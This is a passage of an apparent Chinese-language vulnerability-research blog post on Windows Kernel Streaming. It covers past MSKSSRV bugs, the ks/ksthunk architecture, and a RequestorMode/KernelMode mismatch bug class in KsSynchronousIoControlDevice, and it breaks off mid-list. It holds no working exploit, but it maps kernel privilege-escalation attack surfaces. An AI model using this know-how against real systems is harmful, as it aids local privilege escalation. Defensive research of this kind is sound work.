&lt;p&gt;第一個是 Synacktiv 在 Pwn2Own 2023 中所使用的漏洞 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這是一個邏輯上的漏洞。當 MSKSSRV 使用 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt; 鎖定使用者給的記憶體位置作為 FrameBuffer 時，並沒有設置正確的 AccessMode，導致沒有檢查使用者指定的位置是否屬於 User space。如果使用者給的是 Kernel space 中的位置，它就會把指定的 Kernel 位置映射到 User space 給使用者用，最終導致使用者可以對 Kernel 中的任意位置寫入，利用上簡單且非常穩定，成為了受歡迎的&lt;a href=&quot;https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog&quot;&gt;漏洞之一&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;更多細節可以參考 Synacktiv 在 HITB 2023 HKT 的&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;演講&lt;/a&gt;及 &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; 的&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;部落格文章&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-36802---type-confusion&quot;&gt;CVE-2023-36802 - type confusion&lt;/h3&gt;
&lt;p&gt;這個漏洞則是在 CVE-2023-29360 出來後沒多久被許多人發現，並且在微軟發佈更新時，就已經偵測到利用，是個非常容易被發現的漏洞。MSKSSRV 會先將內部使用的物件（FSContextReg、FSStreamReg）存放在 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object&quot;&gt;FILE_OBJECT&lt;/a&gt; 的 FsContext2 中，然而後續使用時並沒有對 FsContext2 的&lt;strong&gt;型態&lt;/strong&gt;做檢查，導致 type confusion，詳細內容可參考 &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;IBM X-Force 的部落格&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;至此之後，就很少有關於 MSKSSRV 的相關漏洞了。&lt;/p&gt;

&lt;h3 id=&quot;but-is-that-the-end-of-it-&quot;&gt;But is that the end of it ?&lt;/h3&gt;
&lt;p&gt;然而是否這樣就沒洞了呢？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;而我要更準確地回答，No!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;實際上整個 Kernel Streaming 就像下面這張圖這樣 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MSKSSRV 只是冰山一角而已，實際上還有不少潛在的元件，上圖中所寫的都是屬於 Kernel Streaming 的一部分。實際往這方向挖掘之後，最終也在這個攻擊面上取得不少漏洞，就如同流水般的流出漏洞來。
&lt;img src=&quot;/assets/img/blog/20240823/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;順帶一提，我在寫這篇部落格時，chompie 也發表了有關於他在今年 Pwn2Own Vancouver 2024 中所使用的漏洞 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089&quot;&gt;CVE-2024-30089&lt;/a&gt;。這個漏洞也在 MSKSSRV 中，該漏洞發生在 Reference Count 的處理，其成因也很有趣，不過這邊就不多談，詳細內容可參考她&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;發表的文章&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming&quot;&gt;Brief overview of Kernel Streaming&lt;/h2&gt;
&lt;p&gt;那麼，什麼是 Kernel Streaming 呢？ 事實上，我們正常使用電腦情況下就會用到 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Windows 系統上，當我們打開鏡頭、開啟音效以及麥克風等音訊設備時，系統需要從這些設備讀取你的聲音、影像等相關資料到 RAM 中。為了更高效地完成這些資料的傳輸，微軟提供了一個名為 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming&quot;&gt;Kernel Streaming&lt;/a&gt; 的框架，用來處理這些資料。&lt;strong&gt;這個框架主要在 Kernel mode 下運行&lt;/strong&gt;，具有低延遲、良好的擴充性和統一介面等特性，使你能更方便、更高效地處理串流（Stream）資料。&lt;/p&gt;

&lt;p&gt;Kernel Streaming 中，提供了三種多媒體驅動模型：port class、AVStream 和 stream class。這裡將主要介紹 port class 和 AVStream，而 stream class 因為較為罕見且過時，不會多加討論。&lt;/p&gt;

&lt;h3 id=&quot;port-class&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class&quot;&gt;Port Class&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;大多數用於 PCI 和 DMA 型音效裝置的硬體驅動程式，它處理與音訊相關的數據傳輸，例如音量控制、麥克風輸入等等，主要會使用到的元件函式庫會是 portcls.sys。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;avstream&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;AVStream 則是由微軟提供的多媒體類驅動程式，主要支援僅限影片的串流和整合音訊/影片串流，目前跟影像有關的處理多數都跟這類別有關，例如你的視訊鏡頭、擷取卡等等。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;實際上 Kernel Streaming 的使用很複雜，因此這裡只會簡單的敘述一下，更多詳細內容可以參考&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/&quot;&gt;微軟官方文件&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;interact-with-device&quot;&gt;Interact with device&lt;/h2&gt;
&lt;p&gt;在我們想要與音訊設備或是視訊鏡頭等設備互動時該怎麼做呢？其實就跟一般設備互動一樣，可以透過 CreateFile 函數來開啟一個設備。那麼這類型的設備，名稱又會是甚麼呢？其實這邊不太會像是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Devcie\NamedPipe&lt;/code&gt; 這類型的名稱，而是會像下面這樣的路徑 :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\?\hdaudio#subfunc_01&amp;amp;ven_8086&amp;amp;dev_2812&amp;amp;nid_0001&amp;amp;subsys_00000000&amp;amp;rev_1000#6&amp;amp;2f1f346a&amp;amp;0&amp;amp;0002&amp;amp;0000001d#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\ehdmiouttopo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerate-device&quot;&gt;Enumerate device&lt;/h3&gt;
&lt;p&gt;每台電腦都可能不一樣，必須使用 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw&quot;&gt;SetupDiGetClassDevs&lt;/a&gt; 等 API 去列舉設備，一般來說 KS 系列的設備都會註冊在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSCATEGORY*&lt;/code&gt; 底下，像是音訊設備就會註冊在 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio&quot;&gt;KSCATEGORY_AUDIO&lt;/a&gt; 中。&lt;/p&gt;

&lt;p&gt;你也可以使用 KS 所提供的 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice&quot;&gt;KsOpenDefaultDevice&lt;/a&gt; 獲得該類別中第一個符合的 PnP 裝置的 Handle，實際上來說也只是 SetupDiGetClassDevs 和 CreateFile 的封裝而已。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsOpenDefaultDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSCATEGORY_VIDEO_CAMERA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kernel-streaming-object&quot;&gt;Kernel Streaming object&lt;/h3&gt;
&lt;p&gt;我們在開啟這些設備之後，Kernel Streaming 會在 Kernel 中建立一些相關的 Instance，其中最為重要的就是 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters&quot;&gt;KS Filters&lt;/a&gt; 及 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins&quot;&gt;KS Pins&lt;/a&gt;。在 Kernel Streaming 的使用過程中，這些 Instance 會被頻繁使用，它們主要用來封裝設備的硬體功能，方便開發者透過統一的介面進行串流的處理。&lt;/p&gt;

&lt;p&gt;這邊先以 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters&quot;&gt;Audio Filters&lt;/a&gt; 作為例子，其他多數大同小異，我們也只會簡單介紹，其他細節請自行參考微軟官方文件。&lt;/p&gt;

&lt;h4 id=&quot;ks-filters&quot;&gt;KS filters&lt;/h4&gt;
&lt;p&gt;每個 KS Filter 通常代表一個設備或設備的特定功能，在我們打開一個音訊設備後，大部分情況下會對應到一個 Kernel Filter，當我們從音訊設備讀取資料時，這些資料就會先通過這個 KS Filter 進行處理。&lt;/p&gt;

&lt;p&gt;概念上如下圖所示，中間的大框表示一個代表音訊設備的 KS filter。而我們想要從音訊設備中讀取資料時，會從左邊讀入 Filter，經過幾個節點進行處理後，從右邊輸出。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/7.png&quot; alt=&quot;&quot; /&gt;
 (From: https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters)&lt;/p&gt;

&lt;h4 id=&quot;ks-pins&quot;&gt;KS pins&lt;/h4&gt;
&lt;p&gt;上圖中，讀取及輸出資料的點稱為 Pin，Kernel 也有相對應的 KS Pin Object，用於描述這些 Pin 的行為，例如 Pin 是輸入端還是輸出端、支援的格式有哪些等。我們使用時必須在 Filters 上，&lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin&quot;&gt;開啟一個 Pin&lt;/a&gt; 來建立 Instance，才能從設備讀取或輸出資料。&lt;/p&gt;

&lt;h3 id=&quot;ks-property&quot;&gt;KS Property&lt;/h3&gt;
&lt;p&gt;這些 KS Object 都會有自己的 Property，每個 Property 都會有相對應的功能，前面所提到的 Pin 中的資料格式、音量大小及設備的狀態等等，這些都是一個 Property，通常會對應到一組 GUID，我們可以透過 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt; 來讀取或設定這些 Property。&lt;/p&gt;

&lt;p&gt;這大大簡化了多媒體驅動程式的開發，並且確保了不同設備之間的一致性和可擴展性。&lt;/p&gt;

&lt;h3 id=&quot;read-streams-from-webcam&quot;&gt;Read streams from webcam&lt;/h3&gt;
&lt;p&gt;這邊就用個簡單的範例來介紹一下 Application 如何從視訊鏡頭讀取資料&lt;/p&gt;

&lt;p&gt;其最簡單的流程大概如這張圖所示 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;開啟設備後獲得設備 Handle&lt;/li&gt;
  &lt;li&gt;使用這個 Handle 在這個 Filter 上建立 Pin 的 Instance 並獲得 Pin handle&lt;/li&gt;
  &lt;li&gt;使用 IOCTL_KS_PROPERTY 設置 Pin 的狀態到 RUN&lt;/li&gt;
  &lt;li&gt;最後就可以使用 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; 從這個 Pin 中讀資料進來&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;kernel-streaming-architecture&quot;&gt;Kernel Streaming architecture&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;對漏洞研究而言，我們必須先了解其架構，思考有哪些可能的攻擊面&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在初步了解 Kernel Streaming 有哪些功能和操作後，為了找尋漏洞必須先了解一下架構，了解 Windows 是怎麼實作這些功能、分別有哪些元件等等，才知道應該要分析哪些 sys，從哪邊下手會比較好。&lt;/p&gt;

&lt;p&gt;經過我們分析後，整個架構約略會像這張圖所示 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Kernel Stearming 元件中，最為核心的就是 ksthunk.sys 及 ks.sys，幾乎所有功能都會與它們有關。&lt;/p&gt;

&lt;h3 id=&quot;ksthunk-kernel-streaming-wow-thunk-service-driver&quot;&gt;ksthunk (Kernel Streaming WOW Thunk Service Driver)&lt;/h3&gt;
&lt;p&gt;Application 呼叫 DeviceIoControl 後，在 Kernel Streaming 中的&lt;strong&gt;入口點&lt;/strong&gt;，但它功能很簡單，負責將 WoW64 process 中 32-bit 的 requests 轉換成 64-bit 的 requests，使得下層的 driver 就可以不必為 32 位元的結構另外處理。&lt;/p&gt;

&lt;h3 id=&quot;ks-kernel-connection-and-streaming-architecture-library&quot;&gt;ks (Kernel Connection and Streaming Architecture Library)&lt;/h3&gt;
&lt;p&gt;Kernel Streaming 的&lt;strong&gt;核心元件&lt;/strong&gt;之一，它是 Kernel Streaming 的函示庫，負責及轉發 IOCTL_KS_PROPERTY 等 requests 到對應設備的 driver 中，同時也會負責處理 AVStream 的相關功能。&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_&quot;&gt;The work flow of IOCTL_KS_*&lt;/h3&gt;
&lt;p&gt;而在呼叫 DeviceIoControl 時，就會像下圖一樣，將使用者的 requests 依序給相對應的 driver 來處理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而到第 6 步時 ks.sys 就會根據你 requests 的 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;Property&lt;/a&gt; 來決定要交給哪個 driver 及 handler 來處理你的 request。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最終再轉發給相對應的 Driver，如上圖中最後轉發給 portcls 中的 handler 來操作音訊設備。&lt;/p&gt;

&lt;p&gt;到這邊應該對 Kernel Streaming 的架構及流程有初步概念了，接下來就是找洞的時刻。依照現有的元素來看，哪些是值得一看的攻擊面呢？&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-view&quot;&gt;From attacker’s view&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;在挖掘漏洞前，如果能仔細思考怎樣的情況下容易有洞，可以達到事半功倍的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;從一個漏洞研究員的角度來說，大概會有下列這幾個點&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;每個設備中的 Property handler
每個設備中的 KS Object 都有各自的 Property，而且每個 Property 都有各自的實作，有些 Property 處理起來容易出問題。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ks 及 ksthunk 
ks 及 ksthunk 已經有很長一段時間沒有漏洞，但卻是個最容易接觸到的入口點，也許是一個好目標，上一次出現的漏洞是在 2020 年 &lt;a href=&quot;https://x.com/nghiadt1098&quot;&gt;@nghiadt1098&lt;/a&gt; 所找到的兩個漏洞 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889&quot;&gt;CVE-2020-16889&lt;/a&gt; 及 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045&quot;&gt;CVE-2020-17045&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每個 driver 都各自處理一部分的內容
在 Kernel Streaming 的部分功能中，有些 driver 會各自先處理部分的內容，可能會造成一些不一致性的問題。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;我們針對上面幾個角度去對整個 Kernel Streaming 做 Code Review 後，很快的就發現了幾個比較容易發現的漏洞&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;portcls.sys
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38055 (out-of-bounds read when set dataformat for Pin)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38056&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ksthunk
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38054 (out-of-bounds write)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38057&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不過我們這一篇不會一一講解這些漏洞，這幾個多數都是沒有檢查長度或是 index 之類的越界存取等等明顯的洞，也許會在後續的部分慢慢來講解，&lt;a href=&quot;https://x.com/Fr0st1706&quot;&gt;@Fr0st1706&lt;/a&gt; 也在前陣子寫出了 CVE-2024-38054 的&lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;利用&lt;/a&gt;，這邊就暫時留給讀者研究了。&lt;/p&gt;

&lt;p&gt;這篇要提的是，我們在 Review 過程中發現了一些有趣的事情。&lt;/p&gt;

&lt;p&gt;你覺得下面這段程式碼是否安全呢？&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{

    if ( irp-&amp;gt;RequestorMode )
    {
        v14 = 0xC0000010;
    }
    else
    {
        UserBuffer = (unsigned int *)irp-&amp;gt;UserBuffer;
        ...
        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))    (Type3InputBuffer + 0x38))(// call Type3InputBuffer+0x38
                *UserBuffer,
                0LL,
               v19);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到這段程式碼讓我想起了 &lt;a href=&quot;https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/&quot;&gt;CVE-2024-21338&lt;/a&gt;，該漏洞原先並沒有任何檢查，而在修補後則是新增了 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode&quot;&gt;ExGetPreviousMode&lt;/a&gt;，但這邊檢查則是使用了 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp&quot;&gt;IRP&lt;/a&gt; 中的 RequestorMode 來做檢查，不過一般情況下從使用者呼叫的 IOCTL 的 RequestorMode 都會是 UserMode(1) 是不會有問題的。&lt;/p&gt;

&lt;p&gt;此時我又想起來 &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt; 的 &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; 這篇文章。&lt;/p&gt;

&lt;h2 id=&quot;the-overlooked-bug-class&quot;&gt;The overlooked bug class&lt;/h2&gt;

&lt;p&gt;這邊我們必須先來提一下幾個名詞跟概念，不過如果你對 PreviousMode 及 RequestorMode 很熟悉，可以跳至 &lt;a href=&quot;#A-logical-bug-class&quot;&gt;A logical bug class&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;previousmode&quot;&gt;PreviousMode&lt;/h3&gt;
&lt;p&gt;第一個是 PreviousMode，在 Application 中如果使用者透過 Nt* 等 System Service Call 來對設備或檔案中操作時，進入 Kernel 後就會在 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread&quot;&gt;_ETHREAD&lt;/a&gt; 中的 PreviousMode 標註 UserMode(1) 表示這個 System Service Call 是來自 User mode 的 Application。如果你是從 Kernel mode 中，例如設備 driver 呼叫 Zw* System Service Call 的 API 就會標記成 KernelMode(0)。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;requestormode&quot;&gt;RequestorMode&lt;/h3&gt;
&lt;p&gt;另外一個類似的則是 IRP 中的 RequestorMode 這邊就是記錄你原始的 requests 是來自 UserMode 還是 KernelMode，在 Kernel driver 中的程式碼是非常常用到的欄位，通常會來自 PreviousMode。&lt;/p&gt;

&lt;p&gt;很常被用來決定是否要對來自使用者的 requests 做額外檢查，像是 Memory Access Check 或是 Security Access Check，例如下面這個例子中，如果 requests 來自 UserMode 就會檢查使用者提供的位置，如果是從 Kernel 來的，就不做額外檢查增加效率。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但實際上這也出現了一些問題…&lt;/p&gt;

&lt;h3 id=&quot;a-logical-bug-class&quot;&gt;A logical bug class&lt;/h3&gt;
&lt;p&gt;在 &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt; 的 &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; 中，就提到了一種 Bug Class&lt;/p&gt;

&lt;p&gt;這邊可以先想想看，使用者呼叫 NtDeviceIoControlFile 之類的 System Service Call 之後，如果處理的 driver 又去用使用者可控的資料來作為 ZwOpenFile 的參數，會發生什麼事&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 driver 呼叫 ZwOpenFile 之後， PreviousMode 會轉換成為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;，並且在 NtOpenFile 處理時，就會因為 PreviousMode 是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; 的關係少掉大部分的檢查，而後續的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; 也會因此變成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; ，從而繞過 Security Access Check 及 Memory Access Check。不過這邊很看後續處理的 driver 怎麼去實作這些檢查，如果只依賴 RequestorMode 來決定要不要檢查，就可能會有問題。這邊省略了一些細節，實際上的狀況會稍微再複雜一點點，也會跟 CreateFile 的 flag 有關，細節可參考下列幾篇文章 :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local privilege escalation via the Windows I/O Manager: a variant finding collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;這邊有這樣的概念就好，原先這些研究主要是在 Zw* 系列的 System Service Call 上面，大家可以思考一下，有沒有其他類似的情況，也可能造成這種邏輯漏洞呢?&lt;/p&gt;

&lt;h4 id=&quot;the-new-bug-pattern&quot;&gt;The new bug pattern&lt;/h4&gt;
&lt;p&gt;事實上來說是有的，使用 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt; 這個方法去創建一個 DeviceIoControl 的 IRP 時，萬一沒注意到也很容易有這樣的問題。這個 API 主要是 Kernel driver 用來呼叫 IOCTL 的其中一種方法，它會幫你建好 IRP，而後續在去呼叫 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver&quot;&gt;IofCallDriver&lt;/a&gt;，就可以在 Kernel driver 中呼叫 IOCTL。在 &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;Microsoft Learn&lt;/a&gt; 中，有一段話特別值得注意 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也就是預設情況下，如果你沒有特別去設置 RequestorMode 就會直接以 KernelMode 形式去呼叫 IOCTL。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;按照這個思路，我們重新回頭審視一下我們的目標 Kernel Streaming，我們發現了一個吸引我們的地方。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Kernel Streaming 中使用這個 IoBuildDeviceIoControlRequest 地方是在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; ，而主要內容明顯就是在用剛剛提到的方法，在 Kernel 中呼叫 DeviceIoControl，不過這邊看似有好好的設置 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt;，且會根據 KsSynchronousIoControlDevice 參數不同而去設置不同的數值，對於開發者來說會是一個方便的函式庫。&lt;/p&gt;

&lt;p&gt;然而…&lt;/p&gt;

&lt;p&gt;ks!CKsPin::GetState
&lt;img src=&quot;/assets/img/blog/20240823/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!SerializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!UnserializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們發現到在 Kernel Streaming 中，全部有使用到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; 的地方都是固定的使用 KernelMode(0)，到這邊就可以仔細的檢查看看，有用到的地方是否有安全上的問題了。因此我們將 Kernel Streaming 中的 bug pattern 轉換成下列幾點:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;有使用 KsSynchronousIoControlDevice&lt;/li&gt;
  &lt;li&gt;有可控的
    &lt;ul&gt;
      &lt;li&gt;InputBuffer&lt;/li&gt;
      &lt;li&gt;OutputBuffer&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
